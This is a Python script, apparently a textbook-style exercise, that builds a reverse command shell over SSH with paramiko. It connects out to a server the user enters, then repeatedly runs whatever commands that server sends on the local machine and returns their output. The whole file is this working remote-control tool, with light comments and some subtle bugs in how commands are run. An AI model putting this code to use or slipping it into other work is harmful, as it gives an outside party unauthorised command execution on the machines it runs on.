import paramiko
import shlex
import subprocess

def ssh_command(ip, port, user, passwd, command):
    client = paramiko.SSHClient()                   # This line creates an SSHClient object
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())    # This line sets the policy for the client to automatically add the server to the list of known hosts
    client.connect(ip, port = port, username=user, password=passwd)
    
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)
        print(ssh_session.recv(1024).decode())
        while True:
            command =  ssh_session.recv(1024)
            try:
                cmd = command.decode()
                if cmd == 'exit':
                    client.close()
                    break
                cmd_output = subprocess.check_output(shlex.split(cmd), shell = True)   # This line executes the command and stores the output in cmd_output
                ssh_session.send(cmd_output or 'okay')
            except Exception as e:
                ssh_session.send(str(e))
        client.close()
        
    return

if __name__ == '__main__':
    import getpass               # This line imports the getpass module to allow the user to enter the password without displaying it on the screen
    user = getpass.getuser()
    password = getpass.getpass()        
    
    ip = input('Enter server IP: ') 
    port = input('Enter port number: ')
    ssh_command(ip, port, user, password, 'ClientConnected')